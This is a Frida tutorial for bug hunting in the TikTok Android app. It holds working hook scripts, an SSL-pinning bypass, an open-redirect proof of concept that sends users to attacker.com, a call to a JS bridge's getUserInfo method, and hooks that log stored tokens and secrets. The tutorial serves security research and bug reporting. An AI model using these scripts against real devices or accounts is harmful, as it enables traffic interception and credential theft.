# Frida Bug Hunting Guide — Finding Real Bugs with Dynamic Analysis

## Setup

```bash
# Install frida tools
pip install frida-tools

# On device (rooted): push frida-server
adb push frida-server /data/local/tmp/
adb shell chmod +x /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# Verify
frida-ps -U | grep -i tiktok
```

---

## 1. Trace Exported Component Inputs

Hook every exported activity/provider/receiver at startup to see what data they receive.

```javascript
// trace-components.js
Java.perform(() => {
  const Activity = Java.use('android.app.Activity');
  const Bundle = Java.use('android.os.Bundle');

  Activity.onCreate.overload('android.os.Bundle').implementation = function(b) {
    const name = this.getClass().getName();
    const intent = this.getIntent();
    if (intent !== null) {
      const extras = intent.getExtras();
      if (extras !== null) {
        console.log(`[Activity] ${name}`);
        const keys = extras.keySet().toArray();
        for (let i = 0; i < keys.length; i++) {
          const k = keys[i];
          const v = extras.get(k);
          console.log(`  extra: ${k} = ${v}`);
        }
        const data = intent.getDataString();
        if (data) console.log(`  data: ${data}`);
      }
    }
    return this.onCreate(b);
  };
});
```

```bash
frida -U -l trace-components.js com.zhiliaoapp.musically
# Trigger with: adb shell am start -n com.zhiliaoapp.musically/.account.login.OTLIntentHandlerActivity \
#   --es redirect_uri "https://attacker.com"
```

---

## 2. Hook ContentProvider Queries

Catch every query to sensitive providers and see what data is returned.

```javascript
// hook-providers.js
Java.perform(() => {
  const ContentResolver = Java.use('android.content.ContentResolver');
  const Uri = Java.use('android.net.Uri');

  ContentResolver.query.overload(
    'android.net.Uri',
    '[Ljava.lang.String;',
    'android.os.Bundle',
    'android.os.CancellationSignal'
  ).implementation = function(uri, proj, args, cancel) {
    const u = uri.toString();
    if (u.includes('tiktok') || u.includes('musically') || u.includes('onetap') || u.includes('account')) {
      console.log(`[ContentResolver.query] ${u}`);
    }
    const cursor = this.query(uri, proj, args, cancel);
    if (cursor !== null && (u.includes('onetap') || u.includes('account_info'))) {
      cursor.moveToFirst();
      const cols = cursor.getColumnCount();
      for (let i = 0; i < cols; i++) {
        try {
          console.log(`  col[${cursor.getColumnName(i)}] = ${cursor.getString(i)}`);
        } catch(e) {}
      }
      cursor.moveToFirst();
    }
    return cursor;
  };
});
```

---

## 3. Intercept WebView URL Loading

Catch every URL loaded in any WebView — find open redirects, JS injection points, and privileged endpoints.

```javascript
// hook-webview.js
Java.perform(() => {
  const WebView = Java.use('android.webkit.WebView');
  const WebViewClient = Java.use('android.webkit.WebViewClient');

  // Hook loadUrl variants
  WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
    console.log(`[WebView.loadUrl] ${url}`);
    return this.loadUrl(url);
  };

  WebView.loadUrl.overload('java.lang.String', 'java.util.Map').implementation = function(url, headers) {
    console.log(`[WebView.loadUrl+headers] ${url}`);
    const keys = headers.keySet().toArray();
    for (let i = 0; i < keys.length; i++) {
      console.log(`  header: ${keys[i]}: ${headers.get(keys[i])}`);
    }
    return this.loadUrl(url, headers);
  };

  WebView.loadDataWithBaseURL.implementation = function(baseUrl, data, mime, enc, history) {
    console.log(`[WebView.loadDataWithBaseURL] base=${baseUrl}`);
    return this.loadDataWithBaseURL(baseUrl, data, mime, enc, history);
  };

  // Hook addJavascriptInterface — find JS bridge names
  WebView.addJavascriptInterface.implementation = function(obj, name) {
    console.log(`[addJavascriptInterface] name="${name}" class=${obj.getClass().getName()}`);
    // Enumerate all public methods on the bridged object
    const methods = obj.getClass().getDeclaredMethods();
    for (let i = 0; i < methods.length; i++) {
      const m = methods[i];
      const ann = m.getAnnotation(Java.use('android.webkit.JavascriptInterface').class);
      if (ann !== null) {
        console.log(`  @JavascriptInterface: ${m.getName()}(${m.getParameterTypes()})`);
      }
    }
    return this.addJavascriptInterface(obj, name);
  };

  // Catch shouldOverrideUrlLoading to see all navigation
  WebViewClient.shouldOverrideUrlLoading.overload(
    'android.webkit.WebView', 'android.webkit.WebResourceRequest'
  ).implementation = function(view, request) {
    console.log(`[shouldOverrideUrlLoading] ${request.getUrl().toString()}`);
    return this.shouldOverrideUrlLoading(view, request);
  };
});
```

---

## 4. Trace Intent Routing (Open Redirect / IPC Abuse)

Hook `startActivity` to see every intent TikTok fires — find where user-controlled data reaches intent construction.

```javascript
// hook-intents.js
Java.perform(() => {
  const Activity = Java.use('android.app.Activity');
  const Context = Java.use('android.content.Context');
  const Intent = Java.use('android.content.Intent');

  function dumpIntent(tag, intent) {
    try {
      console.log(`[${tag}]`);
      console.log(`  action: ${intent.getAction()}`);
      console.log(`  data:   ${intent.getDataString()}`);
      console.log(`  comp:   ${intent.getComponent()}`);
      const extras = intent.getExtras();
      if (extras !== null) {
        const keys = extras.keySet().toArray();
        for (let i = 0; i < keys.length; i++) {
          const k = keys[i];
          try { console.log(`  extra: ${k} = ${extras.get(k)}`); } catch(e) {}
        }
      }
    } catch(e) { console.log(`  [dump error] ${e}`); }
  }

  Activity.startActivity.overload('android.content.Intent').implementation = function(intent) {
    dumpIntent('startActivity', intent);
    return this.startActivity(intent);
  };

  Activity.startActivityForResult.overload(
    'android.content.Intent', 'int'
  ).implementation = function(intent, req) {
    dumpIntent(`startActivityForResult(${req})`, intent);
    return this.startActivityForResult(intent, req);
  };

  Context.startActivity.overload('android.content.Intent').implementation = function(intent) {
    dumpIntent('Context.startActivity', intent);
    return this.startActivity(intent);
  };
});
```

---

## 5. Hook Crypto — Find Weak Keys / Static IVs

```javascript
// hook-crypto.js
Java.perform(() => {
  const Cipher = Java.use('javax.crypto.Cipher');
  const SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');
  const IvParameterSpec = Java.use('javax.crypto.spec.IvParameterSpec');

  SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function(key, algo) {
    const hex = Array.from(key).map(b => ('0' + (b & 0xFF).toString(16)).slice(-2)).join('');
    console.log(`[SecretKeySpec] algo=${algo} key=${hex} (${key.length * 8}-bit)`);
    return this.$init(key, algo);
  };

  IvParameterSpec.$init.overload('[B').implementation = function(iv) {
    const hex = Array.from(iv).map(b => ('0' + (b & 0xFF).toString(16)).slice(-2)).join('');
    console.log(`[IvParameterSpec] iv=${hex}`);
    const stack = Java.use('java.lang.Thread').currentThread().getStackTrace();
    for (let i = 2; i < Math.min(8, stack.length); i++) {
      console.log(`  ${stack[i]}`);
    }
    return this.$init(iv);
  };

  Cipher.getInstance.overload('java.lang.String').implementation = function(transform) {
    if (transform.includes('ECB') || transform.includes('NoPadding')) {
      console.log(`[Cipher.getInstance] WEAK: ${transform}`);
      console.log(Java.use('android.util.Log').getStackTraceString(
        Java.use('java.lang.Exception').$new('stack')
      ));
    }
    return this.getInstance(transform);
  };
});
```

---

## 6. Dump Network Traffic (Bypass SSL Pinning)

```javascript
// bypass-ssl.js — kills cert pinning so you can MITM with Burp
Java.perform(() => {
  // Kill OkHttp CertificatePinner
  try {
    const CertificatePinner = Java.use('okhttp3.CertificatePinner');
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
      console.log(`[CertificatePinner.check] bypassed for ${arguments[0]}`);
    };
    CertificatePinner.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function() {
      console.log(`[CertificatePinner.check2] bypassed for ${arguments[0]}`);
    };
  } catch(e) {}

  // Kill TrustManager
  try {
    const TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
      console.log(`[TrustManagerImpl.verifyChain] bypassed: ${host}`);
      return untrustedChain;
    };
  } catch(e) {}

  // Kill NetworkSecurityConfig pinning
  try {
    const NetworkSecurityConfig = Java.use('android.security.net.config.NetworkSecurityConfig');
    NetworkSecurityConfig.checkPins.implementation = function() { return; };
  } catch(e) {}

  // Kill custom X509TrustManager implementations
  const X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
  const impls = Java.enumerateLoadedClassesSync().filter(c => {
    try {
      const cls = Java.use(c);
      return cls.class.getInterfaces().some(i => i.getName() === 'javax.net.ssl.X509TrustManager');
    } catch(e) { return false; }
  });
  impls.forEach(cls => {
    try {
      const tm = Java.use(cls);
      tm.checkServerTrusted.implementation = function() {
        console.log(`[X509TrustManager.checkServerTrusted] bypassed: ${cls}`);
      };
    } catch(e) {}
  });
});
```

---

## 7. POC: Trigger OTLIntentHandlerActivity Open Redirect

Test the confirmed TikTok bug — verify `redirect_uri` is unvalidated.

```bash
# Without Frida — direct adb test
adb shell am start \
  -n "com.zhiliaoapp.musically/com.aweme.account.login.OTLIntentHandlerActivity" \
  --es redirect_uri "https://attacker.com" \
  --ez open_login_screen false

# If user is already logged in → after OTL screen, browser opens attacker.com
```

```javascript
// frida-poc-otl-redirect.js — inject into running TikTok and trigger internally
Java.perform(() => {
  const Activity = Java.use('android.app.Activity');
  const Intent = Java.use('android.content.Intent');
  const Uri = Java.use('android.net.Uri');

  // Hook to capture when OTL activity fires the redirect
  const BaseOTL = Java.use('com.ss.android.ugc.aweme.account.otl.BaseOTLIntentHandlerActivity');
  BaseOTL.LLZLL.implementation = function(success) {
    console.log(`[OTL.LLZLL] success=${success}`);
    const redirectUri = this.getIntent().getStringExtra('redirect_uri');
    console.log(`[OTL.LLZLL] redirect_uri="${redirectUri}"`);
    // Verify the unvalidated redirect goes out
    this.LLZLL(success);
  };

  // Hook UriProtector.parse to confirm no validation
  const UriProtector = Java.use('com.bytedance.mt.protector.impl.UriProtector');
  UriProtector.parse.implementation = function(str) {
    console.log(`[UriProtector.parse] input="${str}" → no validation`);
    return this.parse(str);
  };
});
```

---

## 8. POC: Enumerate All JavaScript Bridge Methods

Find every `@JavascriptInterface`-annotated method accessible from WebView JS.

```javascript
// enum-js-bridges.js
Java.perform(() => {
  const WebView = Java.use('android.webkit.WebView');
  const JavascriptInterface = Java.use('android.webkit.JavascriptInterface').class;

  WebView.addJavascriptInterface.implementation = function(obj, name) {
    console.log(`\n[JSBridge] window.${name} = ${obj.getClass().getName()}`);
    const cls = obj.getClass();
    let current = cls;
    while (current !== null) {
      const methods = current.getDeclaredMethods();
      for (let i = 0; i < methods.length; i++) {
        const m = methods[i];
        if (m.getAnnotation(JavascriptInterface) !== null) {
          const params = Java.use('java.util.Arrays').toString(m.getParameterTypes());
          console.log(`  ${m.getName()}(${params}) → ${m.getReturnType().getName()}`);
        }
      }
      current = current.getSuperclass();
    }
    return this.addJavascriptInterface(obj, name);
  };
});
```

Then in Burp/browser DevTools, call the methods:
```javascript
// In WebView JS console (via devtools or injected script)
// After enumerating bridge names and methods:
window.ToutiaoJSBridge.invokeMethod(JSON.stringify({
  __method_name__: 'getUserInfo',
  __callback_id__: 1
}));
```

---

## 9. Hook SharedPreferences and File I/O — Find Sensitive Data at Rest

```javascript
// hook-storage.js
Java.perform(() => {
  // SharedPreferences
  const SharedPreferencesImpl = Java.use('android.app.SharedPreferencesImpl');
  SharedPreferencesImpl.getString.implementation = function(key, def) {
    const val = this.getString(key, def);
    if (val && val.length > 10) {
      console.log(`[SharedPrefs.getString] key="${key}" val="${val.substring(0, 80)}"`);
    }
    return val;
  };

  // File writes — catch cleartext credential storage
  const FileOutputStream = Java.use('java.io.FileOutputStream');
  FileOutputStream.$init.overload('java.lang.String').implementation = function(path) {
    if (path.includes('token') || path.includes('secret') || path.includes('key') || path.includes('auth')) {
      console.log(`[FileOutputStream] sensitive path: ${path}`);
      console.log(Java.use('android.util.Log').getStackTraceString(
        Java.use('java.lang.Exception').$new()
      ));
    }
    return this.$init(path);
  };
});
```

---

## 10. Stalk a Method — Full Argument + Return Trace

When you know a class is interesting but don't know which method matters.

```javascript
// stalk.js — trace every method call on a class
Java.perform(() => {
  const target = 'com.ss.android.ugc.aweme.account.provider.OneTapLoginTokenProvider';
  const cls = Java.use(target);
  const methods = cls.class.getDeclaredMethods();

  methods.forEach(m => {
    const name = m.getName();
    const overloads = cls[name] ? cls[name].overloads : [];
    overloads.forEach(overload => {
      overload.implementation = function() {
        const args = Array.from(arguments).map(a => `${a}`).join(', ');
        console.log(`[${name}] args=(${args})`);
        const ret = overload.apply(this, arguments);
        console.log(`[${name}] → ${ret}`);
        return ret;
      };
    });
  });
});
```

---

## Workflow

```
1. Static → find interesting classes (manifest, strings, jadx)
2. Hook at launch with trace-components.js + hook-intents.js
3. Trigger the component via adb am start or another app
4. Watch console output → identify which method receives attacker data
5. Stalk that class/method → trace full call graph
6. Identify the sink (startActivity, loadUrl, exec, ContentResolver.query)
7. Confirm end-to-end with a PoC app or adb command
8. Screenshot + logcat dump = report evidence
```

---

## Quick Reference

| Goal | Script |
|------|--------|
| Trace all activity extras | `trace-components.js` |
| Watch ContentProvider reads | `hook-providers.js` |
| Find WebView URLs + bridges | `hook-webview.js` |
| Watch startActivity calls | `hook-intents.js` |
| Detect weak crypto | `hook-crypto.js` |
| Bypass SSL pinning | `bypass-ssl.js` |
| Enumerate JS bridge methods | `enum-js-bridges.js` |
| Trace sensitive storage | `hook-storage.js` |
| Stalk a class fully | `stalk.js` |

```bash
# Run multiple scripts at once
frida -U -l bypass-ssl.js -l hook-webview.js -l hook-intents.js -f com.target.app
```
